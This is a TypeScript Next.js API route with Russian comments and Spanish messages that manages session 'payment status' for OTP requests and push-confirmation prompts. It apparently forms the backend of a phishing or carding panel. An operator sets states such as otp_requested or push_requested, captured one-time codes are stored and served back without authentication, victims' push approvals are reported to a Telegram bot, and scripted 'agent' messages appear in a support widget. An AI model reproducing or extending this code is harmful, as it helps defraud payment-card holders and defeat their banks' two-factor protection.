// app/api/payment-status-vercel/route.ts
import { NextRequest, NextResponse } from 'next/server';
import fs from 'fs';
import os from 'os';
import path from 'path';

// pushMessage для отправки сообщений в support widget (путь проверь)
import { pushMessage } from '../../lib/supportStore';

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Папка в системном tmp (кросс-платформенно)
const STATE_DIR = path.join(os.tmpdir(), 'payment-state');
const STATE_FILE = path.join(STATE_DIR, 'payment-state.json');

// Тип состояния
interface PaymentStateEntry {
  status:
    | 'pending'
    | 'otp_requested'
    | 'approved'
    | 'rejected'
    | 'otp_error'
    | 'otp_submitted'
    | 'push_requested';
  otpCode?: string;
  pushPayload?: {
    /** произвольная полезная нагрузка для фронта (title, body, action и т.п.) */
    title?: string;
    body?: string;
    action?: string;
    timeoutSec?: number;
    [key: string]: any;
  };
  timestamp: number; // ms
}

interface PaymentState {
  [sessionId: string]: PaymentStateEntry;
}

// Простое in-memory fallback (работает в процессе; пригодно для dev)
const IN_MEMORY_STORE: PaymentState = (global as any).__PAYMENT_STATE_FALLBACK__ || {};
(global as any).__PAYMENT_STATE_FALLBACK__ = IN_MEMORY_STORE;

function readFileState(): PaymentState | null {
  try {
    if (!fs.existsSync(STATE_FILE)) return null;
    const raw = fs.readFileSync(STATE_FILE, 'utf8');
    if (!raw) return null;
    return JSON.parse(raw) as PaymentState;
  } catch (err) {
    console.error('readFileState error (falling back to memory):', err);
    return null;
  }
}

function writeFileState(state: PaymentState): boolean {
  try {
    // ensure dir exists
    fs.mkdirSync(STATE_DIR, { recursive: true });
    fs.writeFileSync(STATE_FILE, JSON.stringify(state, null, 2), 'utf8');
    return true;
  } catch (err) {
    console.error('writeFileState error (fallback to memory):', err);
    return false;
  }
}

function getState(): PaymentState {
  // Try file first
  const fileState = readFileState();
  if (fileState) return fileState;
  // fallback to in-memory
  return IN_MEMORY_STORE;
}

function setState(state: PaymentState) {
  // Try write to file; if fails, keep in-memory
  const ok = writeFileState(state);
  if (!ok) {
    // copy to in-memory for current process
    Object.keys(IN_MEMORY_STORE).forEach(k => delete (IN_MEMORY_STORE as any)[k]);
    Object.assign(IN_MEMORY_STORE, state);
  }
}

// helper: отправка логов в Telegram (если заданы переменные окружения)
async function sendTelegramLog(text: string) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('Telegram logging disabled: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not set');
    return;
  }
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'Markdown'
      })
    });
  } catch (err) {
    console.error('sendTelegramLog error:', err);
  }
}

/**
 * GET ?sessionId=...
 * Возвращает:
 *  - status
 *  - otpCode (если есть)
 *  - pushPayload (если есть)
 *  - lastEventTs (timestamp ms последнего обновления)
 */
export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url);
    const sessionId = searchParams.get('sessionId');

    if (!sessionId) {
      return NextResponse.json({ error: 'Session ID is required' }, { status: 400 });
    }

    const state = getState();
    const sessionData = state[sessionId];

    if (!sessionData) {
      return NextResponse.json({ status: 'not_found' });
    }

    // Проверяем, не истек ли срок действия (1 час)
    const now = Date.now();
    if (now - sessionData.timestamp > 60 * 60 * 1000) {
      delete state[sessionId];
      setState(state);
      return NextResponse.json({ status: 'expired' });
    }

    return NextResponse.json({
      status: sessionData.status,
      otpCode: sessionData.otpCode,
      pushPayload: sessionData.pushPayload ?? null,
      lastEventTs: sessionData.timestamp
    });
  } catch (error) {
    console.error('Error getting payment status:', error);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}

/**
 * POST body: { sessionId, status, otpCode?, pushPayload?, pushResponse? }
 * - поддерживаются status: 'pending' | 'otp_requested' | 'approved' | 'rejected' | 'otp_error' | 'otp_submitted' | 'push_requested'
 * - при push_requested можно передать pushPayload: { title, body, action, ... }
 * - pushResponse — (необязательно) маркер, что запрос пришёл с PUSH-страницы (autorizar/reject)
 */
export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const {
      sessionId,
      status,
      otpCode,
      pushPayload,
      pushResponse // optional: это приходит с app/push/page.tsx когда user нажимает approved/rejected
    } = body as {
      sessionId?: string;
      status?: string;
      otpCode?: string;
      pushPayload?: any;
      pushResponse?: string;
    };

    if (!sessionId || !status) {
      return NextResponse.json({ error: 'Session ID and status are required' }, { status: 400 });
    }

    // Validate allowed statuses
    const allowed = new Set([
      'pending',
      'otp_requested',
      'approved',
      'rejected',
      'otp_error',
      'otp_submitted',
      'push_requested'
    ]);
    if (!allowed.has(status)) {
      return NextResponse.json({ error: 'Invalid status value' }, { status: 400 });
    }

    const state = getState();

    if (!state[sessionId]) {
      state[sessionId] = {
        status: 'pending',
        timestamp: Date.now()
      };
    }

    // Update core fields
    state[sessionId].status = status as PaymentStateEntry['status'];
    state[sessionId].timestamp = Date.now();

    if (otpCode) {
      state[sessionId].otpCode = otpCode;
    }

    if (pushPayload && typeof pushPayload === 'object') {
      // сохраняем полезную нагрузку пуша (например title/body/action)
      state[sessionId].pushPayload = pushPayload;
    } else if (status !== 'push_requested') {
      // при остальных статусах (кроме push_requested) не трогаем pushPayload
    }

    setState(state);

    // --- additional logging for PUSH actions from frontend ---
    // Если фронт отправил pushResponse (значит действие пришло с /push страницы),
    // логируем в Telegram факт подтверждения/отказа и при отказе шлём сообщение в support widget.
    if (pushResponse) {
      // Compose readable log text
      if (status === 'approved') {
        const text =
          `✅ Пользователь *подтвердил* транзакцию по PUSH\n` +
          `🔑 Session: \`${sessionId}\`\n` +
          `🔘 Ответ (pushResponse): \`${pushResponse}\``;
        await sendTelegramLog(text);
      } else if (status === 'rejected') {
        const text =
          `⚠️ Пользователь *отказался* подтверждать PUSH\n` +
          `🔑 Session: \`${sessionId}\`\n` +
          `🔘 Ответ (pushResponse): \`${pushResponse}\``;
        await sendTelegramLog(text);

        // notify support widget
        try {
          pushMessage(sessionId, {
            id: `support-push-problem-${Date.now()}`,
            from: 'agent',
            text:
              '⚠️ Problema con la confirmación por PUSH. El usuario rechazó la confirmación de la transacción.',
            time: new Date().toISOString()
          });
        } catch (err) {
          console.error('pushMessage error (push reject)', err);
        }
      } else {
        // Для других статусов с pushResponse — логим общий факт
        const text =
          `ℹ️ Acción PUSH recibida\n` +
          `🔑 Session: \`${sessionId}\`\n` +
          `🔘 Ответ (pushResponse): \`${pushResponse}\`\n` +
          `🔁 Nuevo status: \`${status}\``;
        await sendTelegramLog(text);
      }
    }

    return NextResponse.json({
      success: true,
      sessionId,
      status: state[sessionId].status,
      lastEventTs: state[sessionId].timestamp
    });
  } catch (error) {
    console.error('Error updating payment status:', error);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}
